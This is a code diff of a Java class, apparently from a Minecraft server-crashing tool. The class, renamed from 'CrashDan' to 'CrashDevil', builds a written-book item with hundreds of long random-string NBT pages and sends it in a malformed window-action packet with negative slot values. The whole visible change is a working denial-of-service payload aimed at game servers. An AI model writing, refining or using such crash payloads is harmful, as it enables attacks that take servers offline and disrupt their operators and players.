@@ -1,6 +1,5 @@
 package pl.venixpll.system.crash.impl;
 
-import lombok.SneakyThrows;
 import net.minecraft.nbt.NBTBase;
 import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.nbt.NBTTagList;
@@ -17,31 +16,31 @@ import java.util.List;
 import java.util.stream.Collectors;
 import java.util.stream.IntStream;
 
-public class CrashDan extends Crash {
-    public CrashDan() {
-        super("dan",CrashType.NBT);
+public class CrashDevil extends Crash {
+    public CrashDevil() {
+        super("devil",CrashType.NBT);
     }
 
     private Packet packet;
 
-    @SneakyThrows
     @Override
     public void init() {
 
         final NBTTagCompound compound = new NBTTagCompound();
 
-        final List<NBTBase> list = IntStream.range(0, 2500)
-                .mapToObj(ia -> new NBTTagString("-_-_-_-"))
+        final List<NBTBase> list = IntStream.range(0, 340)
+                .mapToObj(ia -> new NBTTagString("fY7rukOvd5cgZJ2uLWKWg0yzX5Ps6mcGmZAIIw60Xl90X8NuWnvxif28WAfoaDY6ey5JyedGJ611a8HdevuGvriJsg98hnczdxvzd9zE6A1cbkJ2eJtBKaRB068fdrMk0OKxkpnseVYeYkautyZGEcF3D3gzspWY15o8T94u0oniWIhPknP2nsW9vvSn62i0wtY8NLFbc5jW9tFpHTH52bGBd5cHHTt8F92XtENE6vsA0IjNWEHdXCgFZetgNdlRpxCwFNfnlC0HGiZnyRTpHH33CyOYTYBxnkoXIbELzKsrBz6h3tv4TzYjGTIgDHduKCLYM3kCegwKaMoXukSSvJHhhKblSmvwEXENN7naxPuZiIX34Ka28GeGmLdRCBxKuNZyH4P2Ovf25jjSrER33uDBBAB3rJuBpuTLb1xO0MhLueor84kJ3MDkDCuPxhmleA2SPR7fp6wCxXd4g8aKmuEHBskFRrrADVC7hxMC2HsNfJxjKuAm"))
                 .collect(Collectors.toList());
 
         final NBTTagList pages = new NBTTagList();
         list.forEach(pages::appendTag);
 
         compound.setTag("pages",pages);
+        compound.setTag("title",new NBTTagString("eH70axevNpWBzL"));
+        compound.setTag("author",new NBTTagString("QerxA39453"));
 
-        final ItemStack stack = new ItemStack(138, 1, 0, compound);
-
-        this.packet = new ClientPlayerWindowActionPacket(0,(short)1,0, WindowAction.CLICK_ITEM,1,stack);
+        final ItemStack itemStack = new ItemStack(386, 1, 0, compound);
+        this.packet = new ClientPlayerWindowActionPacket(-1,(short)-1,2, WindowAction.DROP_ITEM,-1,itemStack);
     }
 
     @Override
